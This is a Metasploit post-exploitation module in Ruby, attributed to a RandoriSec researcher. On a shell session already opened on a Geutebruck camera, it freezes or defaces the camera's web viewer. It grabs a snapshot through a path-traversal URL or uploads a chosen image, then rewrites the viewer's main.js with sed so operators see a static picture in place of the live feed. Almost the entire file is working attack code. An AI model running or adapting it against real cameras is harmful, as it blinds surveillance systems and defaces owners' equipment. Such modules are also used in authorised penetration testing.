##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File


  def initialize
    super(
      'Name'         => 'Geutebruck Camera Deface',
      'Description'  => %q{
        This module will be applied on a session connected to a Geutebruck Camera shell. It will freeze the camera dispaly/deface
        the display of the camera on the web panel with an image.
      },
      'Author'       => 'Ibrahim Ayadhi-RandoriSec',
      'License'      => MSF_LICENSE,
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell']
    )

    register_options(
      [
        OptString.new('IMAGE',   [false, 'Local image path to upload']),
        OptBool.new('FREEZE', [false, 'Freeze the display of the camera'])
      ])
  end

  def run
        if datastore['FREEZE'] == true
          print_status("Freezing the camera")
          freeze_camera
          pwn_main_js
        else
          print_status("Uploading the defacement image..")
          upload_file("/usr/www/uapi-cgi/viewer/image.fcgi", lpath_image)
          pwn_main_js
        end
        print_status("Done ! check the camera view")
  end
  def freeze_camera
    print_status("Taking snapshot")
    cmd_exec("curl http://localhost/test/../uapi-cgi/snapshot.fcgi -o /usr/www/uapi-cgi/viewer/image.fcgi")
  end
  def pwn_main_js    
    print_status("Backing up old main.js")
    cmd_exec("cp /usr/www/viewer/js/main.js /usr/www/viewer/js/main2.js")
    cmd_exec("mv /usr/www/viewer/js/main.js /usr/www/viewer/js/main.js.bak")
    print_status("Using the new main.js")
    cmd_exec("sed '/ImageBuf.src = snapshot_url;/ i snapshot_url=\"/uapi-cgi/viewer/image.fcgi\"' -i /usr/www/viewer/js/main2.js")
    cmd_exec("mv /usr/www/viewer/js/main2.js /usr/www/viewer/js/main.js")
  end
  def lpath_image
        datastore['IMAGE']
  end

  def lpath_main
    datastore['LPATH']
  end
end